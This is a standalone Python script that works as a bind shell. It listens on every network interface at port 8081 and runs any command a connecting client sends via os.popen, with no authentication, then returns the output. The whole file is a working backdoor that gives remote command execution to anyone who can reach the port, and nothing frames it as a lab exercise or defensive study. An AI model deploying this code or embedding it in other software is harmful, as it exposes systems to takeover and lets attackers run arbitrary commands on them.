import socket
import os

def receive_all(socket):
    received_data = b""
    while True:
        chunk = socket.recv(1024)
        if not chunk:
            break
        received_data += chunk
    return received_data.decode()

def main():
    host = '0.0.0.0'  # Listen on all network interfaces
    port = 8081
    
    # Create a socket object
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Bind the socket to the host and port
    server_socket.bind((host, port))
    
    # Listen for incoming connections
    server_socket.listen(1)  # Allow only one connection
    
    print(f"[*] Listening on {host}:{port}")
    
    while True:
        # Accept incoming connection
        client_socket, addr = server_socket.accept()
        print(f"[*] Accepted connection from {addr[0]}:{addr[1]}")
        
        # Receive command from the client
        command = receive_all(client_socket)
        print(f"[*] Received command: {command}")
        
        # Execute the command and capture output
        try:
            output = os.popen(command).read()
        except Exception as e:
            output = f"Error executing command: {str(e)}"
        
        # Send output back to the client
        client_socket.sendall(output.encode())
        
        # Close the client socket
        client_socket.close()

if __name__ == "__main__":
    main()
